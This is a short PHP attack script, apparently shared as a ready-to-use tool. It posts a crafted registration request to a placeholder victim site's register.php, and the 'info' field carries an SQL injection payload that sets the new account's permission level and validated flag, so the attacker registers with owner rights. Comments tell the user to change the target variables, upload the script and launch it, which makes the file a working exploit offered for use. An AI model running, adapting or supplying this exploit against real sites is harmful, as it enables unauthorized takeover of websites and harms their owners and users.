<?php
/////this is the curl functions//////////////////////
class Browser {
function __construct($ua="") {
$this->UserAgent = $ua;
}
public $curl, $count, $data,$UserAgent;
function url($url) { $this->curl = curl_init($url); }
function fields($count) { $this->count = $count; }
function data($data) { $this->data = strtolower($data); }
function send() {
curl_setopt($this->curl, CURLOPT_POST, $this->count);
if(!empty($this->UserAgent)) {
curl_setopt($this->curl, CURLOPT_USERAGENT, $this->UserAgent);
 }
curl_setopt($this->curl, CURLOPT_POSTFIELDS, $this->data);
curl_setopt($this->curl, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($this->curl);
curl_close($this->curl);
return $result;
}
 
}
 ///////the below will auto register as owner at the site, just modified the variables according to your target. ok?//////////////////
$uid = "ayoomo9";
 
$info = "This site is in danger!',perm='4',validated='1'#";
$m = new Browser("AYOOMO9 TOOL");
$m->url("http://victim_site.com/web/register.php");
$m->fields(12);
$m->data("uid=$uid&pwd=hacker9&cpw=hacker9&day=31&month=03-&year=1987-&usx=M&ulc=Hackers world&email=admin@hackers.com&info=$info");
 
print_r($m->send());
 /////////////////just edit and upload to ur server, then launch with browsers//////////////////
?>